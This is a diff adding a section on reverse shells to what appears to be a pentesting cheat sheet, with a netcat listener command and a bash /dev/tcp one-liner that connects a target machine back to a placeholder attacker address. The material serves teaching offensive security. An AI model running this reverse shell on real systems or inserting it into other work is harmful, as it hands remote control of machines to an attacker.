@@ -224,6 +224,20 @@ Also known as John the ripper is a multi brute force tool
 
 
 ### Command & Control and Post Exploitation
+Getting a connection to a system can be gained by executing shell script, which is connecting back to a listenner. This is called a reverse shell. As the Targeted system is calling back to the local system. An example of this on linux would look like this.
+
+On the local machine running a listener app like netcat...
+```
+nc -vlnp 6969
+
+```
+... and on the target machine something like:
+
+```
+bash -i >& /dev/tcp/[LOCAL IP]/6969 0>&1
+
+```
+
 Once you have controll of a system and have an active shell, you should take a couple of steps back. Will persistance be needed or is it a quick in-out mission?
 First lest go over root access before going of persistence.
 
